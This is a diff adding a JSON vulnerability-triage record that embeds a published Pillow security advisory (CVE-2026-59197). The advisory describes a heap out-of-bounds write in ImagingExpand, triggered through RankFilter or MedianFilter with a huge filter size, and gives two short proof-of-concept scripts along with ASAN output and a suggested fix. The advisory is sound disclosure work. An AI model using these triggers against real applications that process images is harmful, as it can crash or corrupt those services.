@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"author\": null, \"closed_at\": null, \"collaborating_teams\": null, \"collaborating_users\": null, \"created_at\": null, \"credits\": [{\"login\": \"Serotav\", \"type\": \"reporter\"}], \"credits_detailed\": [{\"state\": \"accepted\", \"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/132073089?v=4\", \"events_url\": \"https://api.github.com/users/Serotav/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Serotav/followers\", \"following_url\": \"https://api.github.com/users/Serotav/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Serotav/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Serotav\", \"id\": 132073089, \"login\": \"Serotav\", \"node_id\": \"U_kgDOB99GgQ\", \"organizations_url\": \"https://api.github.com/users/Serotav/orgs\", \"received_events_url\": \"https://api.github.com/users/Serotav/received_events\", \"repos_url\": \"https://api.github.com/users/Serotav/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Serotav/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Serotav/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Serotav\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-59197\", \"cvss\": {\"score\": 8.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H\"}, \"cvss_v4\": {\"score\": null, \"vector_string\": null}}, \"cwe_ids\": [], \"cwes\": [], \"description\": \"### Summary\\r\\n\\r\\nPillow's public rank-filter API can trigger a native heap out-of-bounds write\\r\\nwhen given a very large odd filter size.\\r\\n\\r\\nMinimal public API trigger:\\r\\n\\r\\n```python\\r\\nfrom PIL import Image, ImageFilter\\r\\n\\r\\nim = Image.new(\\\"L\\\", (3, 3), 128)\\r\\nim.filter(ImageFilter.MedianFilter(4294967295))\\r\\n```\\r\\n\\r\\n`ImageFilter.RankFilter.filter()` calls `image.expand(size // 2, size // 2)`\\r\\nbefore rank-filter size validation. With `size = 4294967295`, the\\r\\nexpansion margin is `2147483647` (`INT_MAX`). `ImagingExpand()` then computes\\r\\nthe output dimensions with unchecked signed `int` arithmetic. On tested builds,\\r\\nthis wraps to a tiny output image and the border-expansion loop writes past the\\r\\nallocation.\\r\\n\\r\\nThis is reachable through documented public classes (`RankFilter`,\\r\\n`MedianFilter`, `MinFilter`, and `MaxFilter`). No private API, ctypes, or custom\\r\\nPython object is needed.\\r\\n\\r\\n### Details\\r\\n\\r\\nCurrent `src/PIL/ImageFilter.py`:\\r\\n\\r\\n```python\\r\\nclass RankFilter(Filter):\\r\\n    def filter(self, image):\\r\\n        if image.mode == \\\"P\\\":\\r\\n            msg = \\\"cannot filter palette images\\\"\\r\\n            raise ValueError(msg)\\r\\n        image = image.expand(self.size // 2, self.size // 2)\\r\\n        return image.rankfilter(self.size, self.rank)\\r\\n```\\r\\n\\r\\nThe `expand()` call is made before `image.rankfilter(...)`.\\r\\n\\r\\nCurrent `src/libImaging/Filter.c:ImagingExpand()` does not check output-size\\r\\noverflow:\\r\\n\\r\\n```c\\r\\nif (xmargin < 0 && ymargin < 0) {\\r\\n    return (Imaging)ImagingError_ValueError(\\\"bad kernel size\\\");\\r\\n}\\r\\n\\r\\nimOut = ImagingNewDirty(\\r\\n    imIn->mode, imIn->xsize + 2 * xmargin, imIn->ysize + 2 * ymargin\\r\\n);\\r\\n```\\r\\n\\r\\nFor a `3x3` image and `xmargin = ymargin = INT_MAX`, the computed output size\\r\\nwraps to `1x1` on tested builds. The following loop still uses the huge margin:\\r\\n\\r\\n```c\\r\\nfor (x = 0; x < xmargin; x++) {\\r\\n    imOut->image[yout][x] = imIn->image[yin][0];\\r\\n}\\r\\n```\\r\\n\\r\\n`src/libImaging/RankFilter.c` does contain checks that would reject this size:\\r\\n\\r\\n```c\\r\\nif (!(size & 1)) {\\r\\n    return (Imaging)ImagingError_ValueError(\\\"bad filter size\\\");\\r\\n}\\r\\nif (size > INT_MAX / size || size > INT_MAX / (size * (int)sizeof(FLOAT32))) {\\r\\n    return (Imaging)ImagingError_ValueError(\\\"filter size too large\\\");\\r\\n}\\r\\n```\\r\\n\\r\\nBut  those checks are reached only after `RankFilter.filter()` has already\\r\\ncalled `image.expand(...)`.\\r\\n\\r\\nMode `\\\"L\\\"` produces 1-byte OOB stores. Modes `\\\"I\\\"` and `\\\"F\\\"` produce 4-byte OOB\\r\\nstores. The repeated value written OOB is copied from the source image border\\r\\npixel, so attacker-supplied image bytes can influence it. This is a sequential\\r\\noverwrite, not an arbitrary-address write.\\r\\n\\r\\n### PoC\\r\\n\\r\\nMinimal ASAN crash PoC:\\r\\n\\r\\n```python\\r\\nfrom PIL import Image, ImageFilter\\r\\n\\r\\nim = Image.new(\\\"L\\\", (3, 3), 128)\\r\\nim.filter(ImageFilter.MedianFilter(4294967295))\\r\\n```\\r\\n\\r\\nObserved on local Pillow `12.3.0.dev0` ASAN target:\\r\\n\\r\\n```text\\r\\nERROR: AddressSanitizer: heap-buffer-overflow\\r\\nWRITE of size 1\\r\\nImagingExpand /out/src/src/libImaging/Filter.c:99\\r\\n_expand_image /out/src/src/_imaging.c:1100\\r\\n0 bytes after a 1-byte allocation\\r\\n```\\r\\n\\r\\n4-byte write variant with source pixel loaded from normal image bytes:\\r\\n\\r\\n```python\\r\\nfrom io import BytesIO\\r\\nfrom PIL import Image, ImageFilter\\r\\n\\r\\nSIZE = 4294967295\\r\\nPIXEL = 0x41424344\\r\\n\\r\\nsrc = BytesIO()\\r\\nImage.new(\\\"I\\\", (3, 3), PIXEL).save(src, format=\\\"TIFF\\\")\\r\\n\\r\\nim = Image.open(BytesIO(src.getvalue()))\\r\\nim.load()\\r\\nassert im.mode == \\\"I\\\"\\r\\nassert im.getpixel((0, 0)) == PIXEL\\r\\n\\r\\nim.filter(ImageFilter.MedianFilter(SIZE))\\r\\n```\\r\\n\\r\\nObserved ASAN signature:\\r\\n\\r\\n```text\\r\\nERROR: AddressSanitizer: heap-buffer-overflow\\r\\nWRITE of size 4\\r\\nImagingExpand /out/src/src/libImaging/Filter.c:101\\r\\n_expand_image /out/src/src/_imaging.c:1100\\r\\n0 bytes after a 4-byte allocation\\r\\n```\\r\\n\\r\\nVersion checks:\\r\\n\\r\\n```text\\r\\nPillow 1.0: ASAN heap-buffer-overflow WRITE confirmed at runtime\\r\\nPillow 12.3.0.dev0: ASAN heap-buffer-overflow WRITE confirmed at runtime\\r\\nPillow 1.0 through 12.2.0: source sweep confirmed the vulnerable public\\r\\n                           validation order and unchecked ImagingExpand arithmetic\\r\\nupstream/main at 9c1097c861420c77af53c7c9af2a1382e2bfaa8b: still affected\\r\\n```\\r\\n\\r\\n### Impact\\r\\n\\r\\nIt is a heap out-of-bounds write in Pillow's native C extension, reachable\\r\\nthrough public image-filter classes.\\r\\n\\r\\nApplications are impacted if an untrusted user can control the rank-filter\\r\\nsize/configuration passed to Pillow. If the image is also attacker-supplied, the\\r\\nsource pixel value written out of bounds can be attacker-influenced, including\\r\\n4-byte values for mode `\\\"I\\\"` images.\\r\\n\\r\\n\\r\\n## Possible fix\\r\\n\\r\\nValidate the rank-filter size before calling `image.expand(...)`, and harden\\r\\n`ImagingExpand()` against invalid margins and overflow:\\r\\n\\r\\n```c\\r\\nif (xmargin < 0 || ymargin < 0) {\\r\\n    return (Imaging)ImagingError_ValueError(\\\"bad kernel size\\\");\\r\\n}\\r\\nif (xmargin > (INT_MAX - imIn->xsize) / 2 ||\\r\\n    ymargin > (INT_MAX - imIn->ysize) / 2) {\\r\\n    return (Imaging)ImagingError_ValueError(\\\"bad kernel size\\\");\\r\\n}\\r\\n```\", \"ghsa_id\": \"GHSA-xj96-63gp-2gmr\", \"html_url\": \"https://github.com/python-pillow/Pillow/security/advisories/GHSA-xj96-63gp-2gmr\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-xj96-63gp-2gmr\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-59197\"}], \"private_fork\": null, \"published_at\": \"2026-07-07T08:59:16Z\", \"publisher\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/3112309?v=4\", \"events_url\": \"https://api.github.com/users/radarhere/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/radarhere/followers\", \"following_url\": \"https://api.github.com/users/radarhere/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/radarhere/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/radarhere\", \"id\": 3112309, \"login\": \"radarhere\", \"node_id\": \"MDQ6VXNlcjMxMTIzMDk=\", \"organizations_url\": \"https://api.github.com/users/radarhere/orgs\", \"received_events_url\": \"https://api.github.com/users/radarhere/received_events\", \"repos_url\": \"https://api.github.com/users/radarhere/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/radarhere/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/radarhere/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/radarhere\", \"user_view_type\": \"public\"}, \"severity\": \"high\", \"state\": \"published\", \"submission\": null, \"summary\": \"Heap out-of-bounds write in Pillow `ImageFilter.RankFilter` via integer overflow in `ImagingExpand`\", \"updated_at\": \"2026-07-07T21:57:12Z\", \"url\": \"https://api.github.com/repos/python-pillow/Pillow/security-advisories/GHSA-xj96-63gp-2gmr\", \"vulnerabilities\": [{\"package\": {\"ecosystem\": \"pip\", \"name\": \"Pillow\"}, \"patched_versions\": \">= 12.3.0\", \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 12.2.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "pillow:ghsa-xj96-63gp-2gmr",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "Pillow: <= 12.2.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-59197"
+    ],
+    "cvss_score": 8.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+    "fixed_versions": [
+      "Pillow: >= 12.3.0"
+    ],
+    "mitigations": [],
+    "products": [
+      "Pillow"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-17T23:40:05.641418Z",
+  "provenance": {
+    "content_sha256": "ef5100e37087348ff14fa1da63d996d0f810aa8fdceef2eaa71a99db2a91dc2c",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-07T08:59:16Z",
+  "schema_version": 1,
+  "source_id": "pillow_github",
+  "source_url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-xj96-63gp-2gmr",
+  "status": "active",
+  "title": "Heap out-of-bounds write in Pillow `ImageFilter.RankFilter` via integer overflow in `ImagingExpand`",
+  "updated_at": "2026-07-07T21:57:12Z",
+  "vendor": "Pillow",
+  "vendor_advisory_id": "GHSA-xj96-63gp-2gmr"
+}
